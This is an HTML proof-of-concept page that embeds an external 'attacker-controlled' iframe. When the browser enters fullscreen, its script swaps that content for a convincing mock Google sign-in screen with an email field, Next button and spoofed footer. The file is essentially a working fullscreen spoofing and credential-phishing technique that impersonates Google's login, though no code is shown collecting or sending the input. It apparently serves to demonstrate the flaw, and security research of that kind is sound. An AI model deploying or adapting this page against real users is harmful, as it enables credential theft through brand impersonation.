<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Fullscreen PoC</title>

  <style>
    * {
      box-sizing: border-box;
    }

    html,
    body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      font-family: Arial, sans-serif;
      background: #000;
    }

    #container {
      position: relative;
      width: 100%;
      height: 100%;
    }

    /* Embedded page */
    #video-wrapper {
      position: absolute;
      inset: 0;
      background: #000;
      z-index: 1;
    }

    #ytplayer {
      width: 100%;
      height: 100%;
      border: 0;
      display: block;
    }

    /* Mock login page */
    #error-screen {
      position: absolute;
      inset: 0;

      display: flex;
      align-items: center;
      justify-content: center;

      background: #fff;

      opacity: 0;
      pointer-events: none;

      z-index: 10;
      transition: opacity 0.15s ease;
    }

    #error-screen.active {
      opacity: 1;
      pointer-events: auto;
    }

    .login-card {
      width: 450px;
      max-width: calc(100% - 32px);

      border: 1px solid #dadce0;
      border-radius: 8px;

      padding: 40px;

      background: #fff;
    }

    .google-logo {
      font-size: 38px;
      font-weight: 500;
      margin-bottom: 20px;
      letter-spacing: -2px;
    }

    .g-blue {
      color: #4285f4;
    }

    .login-card h1 {
      margin: 0 0 10px;

      font-size: 24px;
      font-weight: 400;

      color: #202124;
    }

    .account-text {
      margin: 0 0 32px;

      font-size: 16px;
      color: #202124;
    }

    .email-input {
      width: 100%;
      height: 54px;

      padding: 0 14px;

      border: 1px solid #dadce0;
      border-radius: 4px;

      outline: none;

      font-size: 16px;
      color: #202124;
    }

    .email-input:focus {
      border: 2px solid #1a73e8;
    }

    .forgot {
      display: inline-block;

      margin-top: 10px;

      color: #1a73e8;

      font-size: 14px;
      font-weight: 500;

      text-decoration: none;
    }

    .guest-text {
      margin: 30px 0 0;

      color: #5f6368;

      font-size: 14px;
      line-height: 1.5;
    }

    .actions {
      display: flex;

      justify-content: space-between;
      align-items: center;

      margin-top: 30px;
    }

    .create-btn {
      border: 0;
      background: transparent;

      color: #1a73e8;

      font-size: 14px;
      font-weight: 500;

      cursor: pointer;
    }

    .next-btn {
      border: 0;
      border-radius: 4px;

      padding: 10px 24px;

      background: #1a73e8;
      color: #fff;

      font-size: 14px;
      font-weight: 500;

      cursor: pointer;
    }

    .fake-footer {
      position: absolute;

      bottom: 20px;
      right: 30px;

      color: #5f6368;

      font-size: 12px;
    }

    @media (max-width: 600px) {

      .login-card {
        width: calc(100% - 24px);
        padding: 28px;
      }

      .fake-footer {
        right: 15px;
        bottom: 12px;
      }
    }
  </style>
</head>

<body>

<div id="container">

  <!-- Embedded attacker-controlled page -->
  <div id="video-wrapper">

    <iframe
      id="ytplayer"
      src="https://helpful-faun-a7653e.netlify.app/cho.html"
      title="Fullscreen PoC"
      frameborder="0"
      allow="fullscreen"
      allowfullscreen>
    </iframe>

  </div>


  <!-- Mock Gmail-style login UI -->
  <div id="error-screen">

    <div class="login-card">

      <div class="google-logo">
        <span class="g-blue">G</span>
      </div>

      <h1>Sign in</h1>

      <p class="account-text">
        Use your Google Account
      </p>

      <input
        class="email-input"
        type="text"
        placeholder="Email or phone"
        autocomplete="off"
      >

      <a class="forgot" href="javascript:void(0)">
        Forgot email?
      </a>

      <p class="guest-text">
        Not your computer? Use Guest mode to sign in privately.
      </p>

      <div class="actions">

        <button
          class="create-btn"
          type="button">
          Create account
        </button>

        <button
          class="next-btn"
          type="button">
          Next
        </button>

      </div>

    </div>

    <div class="fake-footer">
      English (United States)&nbsp;&nbsp;&nbsp;
      Help&nbsp;&nbsp;&nbsp;
      Privacy&nbsp;&nbsp;&nbsp;
      Terms
    </div>

  </div>

</div>


<script>

  const videoWrapper =
    document.getElementById("video-wrapper");

  const errorScreen =
    document.getElementById("error-screen");

  const iframe =
    document.getElementById("ytplayer");

  let activated = false;


  /*
   * Check whether the document is actually fullscreen.
   */
  function isInRealFullscreen() {

    return !!(
      document.fullscreenElement ||
      document.webkitFullscreenElement ||
      document.mozFullScreenElement ||
      document.msFullscreenElement
    );

  }


  /*
   * Immediately replace the embedded content
   * with the mock login page after fullscreen.
   */
  function activateError() {

    if (activated)
      return;

    activated = true;

    /*
     * Hide the original embedded content immediately.
     */
    videoWrapper.style.display = "none";

    /*
     * Show mock login page.
     */
    errorScreen.classList.add("active");

  }


  /*
   * Restore original page after leaving fullscreen.
   */
  function deactivateError() {

    activated = false;

    errorScreen.classList.remove("active");

    videoWrapper.style.display = "block";

  }


  /*
   * Fullscreen state handler.
   */
  function handleFullscreenChange() {

    if (isInRealFullscreen()) {

      console.log(
        "Fullscreen entered"
      );

      /*
       * Show the mock login UI immediately.
       */
      activateError();

    } else {

      console.log(
        "Fullscreen exited"
      );

      deactivateError();

    }

  }


  /*
   * Standard Fullscreen API
   */
  document.addEventListener(
    "fullscreenchange",
    handleFullscreenChange
  );


  /*
   * WebKit
   */
  document.addEventListener(
    "webkitfullscreenchange",
    handleFullscreenChange
  );


  /*
   * Firefox
   */
  document.addEventListener(
    "mozfullscreenchange",
    handleFullscreenChange
  );


  /*
   * Microsoft
   */
  document.addEventListener(
    "MSFullscreenChange",
    handleFullscreenChange
  );


  /*
   * Iframe loaded.
   */
  iframe.addEventListener("load", function () {

    console.log(
      "Embedded page loaded:",
      iframe.src
    );

  });

</script>

</body>
</html>
